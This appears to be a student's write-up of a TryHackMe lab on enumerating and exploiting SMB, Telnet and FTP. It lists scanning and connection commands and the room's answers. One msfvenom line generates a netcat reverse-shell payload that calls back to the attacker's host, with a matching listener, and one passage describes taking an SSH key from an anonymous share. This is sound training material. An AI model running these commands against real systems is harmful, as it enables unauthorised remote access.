# Network Services

**Platform:** TryHackMe
**Category:** Network Services / Enumeration / Exploitation
**Difficulty:** Easy
**Status:** ✅ Completed

## 🎯 Objective

Learn how to enumerate and exploit common network services including SMB, Telnet, and FTP. The room focuses on service enumeration, misconfigurations, anonymous access, weak credentials, and basic exploitation techniques.

---

# 1. SMB

## 🔍 What I Learned

* SMB stands for **Server Message Block**.
* SMB is a **client-server protocol** used for network file and resource sharing.
* SMB commonly operates over **TCP 445** and can also use NetBIOS over TCP/IP.
* Samba provides SMB functionality on Unix/Linux systems.
* SMB shares can expose files, directories, printers, and other resources.
* Misconfigured anonymous shares can expose sensitive information.

## 🛠️ Tools / Commands

```bash
# Nmap SMB enumeration
nmap -p 139,445 -sV MACHINE_IP

# Full Enum4Linux enumeration
enum4linux -a MACHINE_IP

# Enumerate SMB shares
enum4linux -S MACHINE_IP

# SMB client connection
smbclient //MACHINE_IP/SHARE -U Anonymous -p 445

# List files
ls

# Download a file
get FILE
```

## 💡 Key Findings

* **SMB:** Server Message Block
* **Protocol type:** Client-server
* **Protocol suite:** TCP/IP
* **Samba:** Runs on Unix/Linux systems
* `enum4linux` can enumerate users, groups, shares, machines, and password policies.
* Anonymous SMB access can expose sensitive files without authentication.

## 🧪 SMB Answers

```text
SMB = Server Message Block

Protocol type = Client-server

Protocol suite = TCP/IP

Samba = Unix/Linux systems

SMB share syntax:
smbclient //10.10.10.2/secret -U suit -p 445

Anonymous access:
Y

Interesting profile:
Bob

Remote-work service:
SSH

Directory:
.ssh

Useful key:
id_rsa
```

> Machine-specific answers such as the exact number of open ports, workgroup, hostname, OS version and `smb.txt` flag should be recorded from the results of my own deployed machine rather than assumed from the room description.

---

# 2. Telnet

## 🔍 What I Learned

* Telnet is a **client-server protocol** for remotely interacting with another system.
* Telnet normally uses **TCP port 23**.
* Telnet sends communication in **plaintext**.
* SSH replaced Telnet for secure remote administration because SSH provides encryption.
* A Telnet service running on a non-standard port can easily be missed by a default Nmap scan.
* Enumeration can reveal service banners and possible usernames.
* A misconfigured Telnet service can provide a foothold into a system.

## 🛠️ Tools / Commands

```bash
# Scan all ports
nmap -p- MACHINE_IP

# Service/version detection
nmap -sV -p- MACHINE_IP

# Connect to Telnet
telnet MACHINE_IP PORT

# Listen for ICMP traffic
sudo tcpdump ip proto \\icmp -i tun0

# Generate reverse shell payload
msfvenom -p cmd/unix/reverse_netcat \
lhost=LOCAL_IP lport=4444 R

# Netcat listener
nc -lvnp 4444
```

## 💡 Key Findings

* **Protocol:** Telnet
* **Default port:** 23
* **Replacement:** SSH
* **Security issue:** No encryption
* Communication is transmitted in **plaintext**.
* Always scan the complete port range because services may run on non-standard ports.

## 🧪 Telnet Answers

```text
Client-server protocol:
Y

Replacement:
SSH

Connect to 10.10.10.3 on port 23:
telnet 10.10.10.3 23

Lack of:
Encryption
```

## 🧠 Reverse Shell Concept

A reverse shell causes the target machine to initiate a connection back to the attacker's listening machine.

```text
Target → Attacker
       ← Shell
```

The room demonstrated this using `msfvenom` to generate a Netcat payload and `nc` as the listener.

---

# 3. FTP

## 🔍 What I Learned

* FTP stands for **File Transfer Protocol**.
* FTP uses a **client-server model**.
* Standard FTP uses **TCP port 21** for the control channel.
* FTP uses separate command/control and data channels.
* FTP supports **Active** and **Passive** connection modes.
* Standard FTP does not encrypt authentication or transferred data.
* Anonymous FTP access can expose files without valid credentials.
* Weak credentials can potentially be attacked with password dictionaries.

## 🛠️ Tools / Commands

```bash
# Scan for FTP
nmap -p 21 -sV MACHINE_IP

# Connect to FTP
ftp MACHINE_IP

# Anonymous login
Username: anonymous
Password: <blank>

# List files
ls

# Download file
get FILE

# Exit
bye
```

## 💡 Key Findings

* **FTP:** File Transfer Protocol
* **Communication model:** Client-server
* **Default port:** 21
* **Connection modes:** Active and Passive
* FTP separates control and data communication.
* FTP traffic is normally transmitted without encryption.
* Anonymous FTP configuration can expose sensitive files.

## 🧪 FTP Answers

```text
Communication model:
Client-server

Standard FTP port:
21

FTP connection modes:
2

Anonymous FTP:
Possible when configured by the server
```

### FTP Enumeration

```bash
nmap -p- -sV MACHINE_IP
```

Important information to record:

```text
FTP port:
[record from scan]

FTP variant/version:
[record from scan]

Anonymous access:
[record result]

Anonymous directory file:
[record filename]

Possible username:
[record username]
```

---

# 🧰 Main Tools Used

```text
Nmap
Enum4Linux
SMBClient
FTP Client
Telnet
Wireshark
tcpdump
Netcat
Metasploit / msfvenom
Hydra
```

## 📌 Important Commands

```bash
# Full port scan
nmap -p- MACHINE_IP

# Service detection
nmap -sV MACHINE_IP

# SMB enumeration
enum4linux -a MACHINE_IP

# SMB connection
smbclient //MACHINE_IP/SHARE -U Anonymous -p 445

# FTP connection
ftp MACHINE_IP

# Telnet connection
telnet MACHINE_IP PORT

# Network capture
sudo tcpdump ip proto \\icmp -i tun0

# Netcat listener
nc -lvnp 4444
```

## 🧠 What I Learned

I learned how common network services can become an attack surface when they are misconfigured or poorly secured.

The SMB section demonstrated how enumeration can reveal shares, users and sensitive files. Telnet demonstrated the risks of plaintext remote administration and the importance of checking non-standard ports. FTP demonstrated the risks of anonymous access and weak credentials.

The main lesson was that **enumeration comes before exploitation**. Identifying ports, services, versions, usernames, shares and configuration weaknesses provides the information needed to determine the appropriate next step.

## ⚠️ Mistakes / Things I Didn't Understand

* Initially focused mainly on standard ports and learned why full port scans are important.
* Needed to understand the difference between SMB enumeration and accessing an SMB share.
* Learned that SMB shares can contain sensitive information even without an obvious vulnerability.
* Needed to understand why Telnet is insecure compared with SSH.
* Learned that services can run on non-standard ports.
* Needed to understand the difference between FTP control and data channels.
* Learned that anonymous FTP access is a configuration weakness.
* Learned how enumeration information such as usernames can become useful during later exploitation.
* Learned the basic concept of a reverse shell and how a listener receives the connection.

## 🔗 Room

https://tryhackme.com/room/networkservices
